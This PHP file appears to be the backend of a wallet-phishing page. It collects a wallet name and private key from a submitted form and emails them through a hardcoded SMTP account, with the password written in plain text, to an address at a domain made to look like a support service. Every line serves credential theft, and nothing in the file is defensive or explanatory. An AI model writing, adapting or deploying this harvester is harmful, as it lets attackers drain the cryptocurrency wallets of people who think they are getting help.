<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
//functions
function sanitize($dirty){
	return htmlentities($dirty, ENT_QUOTES, "UTF-8");
}

$walletName = ((isset($_POST['wallet_name3']) && $_POST['wallet_name3'] != '')?sanitize($_POST['wallet_name3']):'');
$privatekey = ((isset($_POST['privatekey']) && $_POST['privatekey'] != '')?sanitize($_POST['privatekey']):'');
 
    $email = 'support@manual.appprocedure.com';
    $subject = $walletName;
    $message = 'The wallet name is: '.$walletName.'.<br> The privatekey is: '.$privatekey;
 
 
$mail = new PHPMailer;
$mail->isSMTP();
$mail->SMTPDebug = 2;
$mail->Host = 'smtp.titan.email';
$mail->Port = 587;
$mail->Encryption = starttls;
$mail->SMTPAuth = true;
$mail->Username = 'support@manual.appprocedure.com';
$mail->Password = 'manual123';
$mail->setFrom('support@manual.appprocedure.com', $subject);
$mail->addReplyTo('support@manual.appprocedure.com', $subject);
$mail->addAddress('support@manual.appprocedure.com', $subject);
$mail->Subject = $subject;
$mail->msgHTML(file_get_contents('message.html'), __DIR__);
$mail->isHTML(true);
$mail->Body = $message;
//$mail->addAttachment('../img/logo.jpg');
if (!$mail->send()) {
    echo 'Mailer Error: ' . $mail->ErrorInfo;
} else {
    echo 'The email message was sent.';
}
